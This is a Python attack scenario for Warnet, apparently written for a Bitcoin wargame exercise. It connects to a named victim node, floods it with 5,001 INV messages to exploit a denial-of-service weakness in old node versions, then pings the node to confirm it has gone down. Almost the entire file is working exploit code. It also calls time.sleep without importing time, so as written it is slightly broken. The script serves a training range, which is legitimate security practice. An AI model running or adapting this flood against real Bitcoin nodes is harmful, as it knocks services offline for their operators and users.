#!/usr/bin/env python3

import socket

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import MSG_TX, CInv, msg_inv, msg_ping
from test_framework.p2p import P2PInterface

# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class Inv5K(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate INV attack using a scenario and P2PInterface"
        )
        parser.usage = "warnet run v94_5k_invs.py --debug"

    def get_node(self) : 
        for n in self.nodes:
            try:
                n.getnetworkinfo()
                node = n
                break
            except Exception as e:
                continue

        return node


    # Scenario entrypoint
    def run_test(self):
        node = self.get_node()

        # We pick a node on the network to attack
        # We know this one is vulnderable to 5k inv messages based on it's subver
        # Change this to your teams colour if running in the battleground
        victim = "armada-0"

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=node.p2pport, net=node.chain, timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        msg = msg_inv([CInv(MSG_TX, 0x12345)])
        for i in range(5001):
            try:
                attacker.send_message(msg)
                self.log.info(f"Sent inv message {i}")
            except:
                continue

        self.log.info(f"Trying to ping {victim}...")
        self.log.info(f"Ping count: {attacker.ping_counter}")
        try:
            ping = msg_ping()

            while attacker.ping_counter < 5:
                time.sleep(3)
                self.log.info(f"Ping: {attacker.ping_counter}")
                attacker.send_message(ping)
            self.log.info("The attack ended unsuccessfully!")

        except:
            self.log.info(f"It was not possible to communicate with {victim}!")
            self.log.info(f"Ping count: {attacker.ping_counter}")
            self.log.info(f"Attack successfully completed!")


def main():
    Inv5K().main()


if __name__ == "__main__":
    main()
